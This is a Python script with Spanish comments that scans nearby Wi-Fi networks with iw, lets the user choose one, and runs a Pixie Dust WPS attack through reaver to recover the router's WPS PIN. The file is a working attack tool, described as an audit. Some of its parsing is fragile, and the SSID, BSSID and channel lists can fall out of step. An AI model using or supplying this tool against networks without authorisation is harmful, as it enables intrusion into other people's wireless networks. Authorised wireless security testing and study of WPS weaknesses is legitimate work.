import subprocess
import re
import os
import tempfile
import time

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y muestra la salida"""
    if use_sudo:
        command = f"su -c '{command}'"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        return stdout.decode(), stderr.decode()
    else:
        print(stderr.decode())
        return stdout.decode(), stderr.decode()

def extract_value(output, key):
    """Extrae un valor de la salida del comando basado en una clave"""
    match = re.search(f"{key} ([0-9a-fA-F:]+)", output)
    return match.group(1) if match else None

def check_tool_availability(tool):
    """Verifica si una herramienta está disponible en el sistema"""
    result, _ = run_command(f"which {tool}")
    if result.strip() == "":
        print(f"Error: {tool} no está instalado o no está en el PATH.")
        return False
    return True

def scan_wifi(interface):
    """Escanear redes Wi-Fi cercanas utilizando la interfaz especificada"""
    print(f"Escaneando redes Wi-Fi en la interfaz {interface}...")
    resultado, _ = run_command(f"iw dev {interface} scan", use_sudo=True)
    redes = []
    bssids = []
    canales = []
    for linea in resultado.split('\n'):
        if "SSID" in linea:
            essid = linea.split(':')[1].strip()
            redes.append(essid)
        if "BSS" in linea:
            bssid = linea.split()[1]
            bssid = bssid.split('(')[0]  # Limpiar el BSSID
            bssids.append(bssid)
        if "freq" in linea:
            try:
                freq = int(linea.split()[1])
                channel = int((freq - 2407) / 5)
                canales.append(channel)
            except ValueError:
                continue
    return redes, bssids, canales

def perform_pixie_dust_attack(interface, bssid):
    """Realiza el ataque Pixie Dust usando reaver con la opción -K."""
    print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
    reaver_path = "~/reaver-wps-fork-t6x/src/reaver"
    command = f"{reaver_path} -i {interface} -b {bssid} -K"
    print(f"Ejecutando reaver: {command}")
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    while True:
        output = process.stdout.readline()
        if output == b'' and process.poll() is not None:
            break
        if output:
            os.system('clear')
            print(output.strip().decode())
        time.sleep(0.1)

    stdout, stderr = process.communicate()

    print("Salida de reaver:")
    print(stdout.decode())
    print(stderr.decode())

    if "WPS pin:" in stdout.decode():
        pin = extract_value(stdout.decode(), "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        print(stdout.decode())
        return None

def main():
    # Verificar la disponibilidad de las herramientas necesarias
    tools = ["iw", "~/reaver-wps-fork-t6x/src/reaver"]
    for tool in tools:
        if not check_tool_availability(tool):
            return

    # Escanear redes Wi-Fi utilizando la interfaz del hotspot (por ejemplo, wlan1)
    hotspot_interface = "wlan1"  # Asegúrate de que esta sea la interfaz correcta para el hotspot en tu dispositivo
    redes, bssids, canales = scan_wifi(hotspot_interface)
    if redes:
        print("Redes disponibles:")
        for i, red in enumerate(redes):
            print(f"{i + 1}. {red} - BSSID: {bssids[i]}")
        
        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        bssid_seleccionado = bssids[seleccion]
        canal_seleccionado = canales[seleccion]
        
        # Limpiar la pantalla
        os.system('clear')
        
        print(f"Red seleccionada: {red_seleccionada}")
        print(f"BSSID: {bssid_seleccionado}")
        print(f"Canal: {canal_seleccionado}")
        
        # Realizar el ataque Pixie Dust utilizando la interfaz del hotspot
        perform_pixie_dust_attack(hotspot_interface, bssid_seleccionado)
    else:
        print("No se encontraron redes WiFi.")

if __name__ == "__main__":
    main()





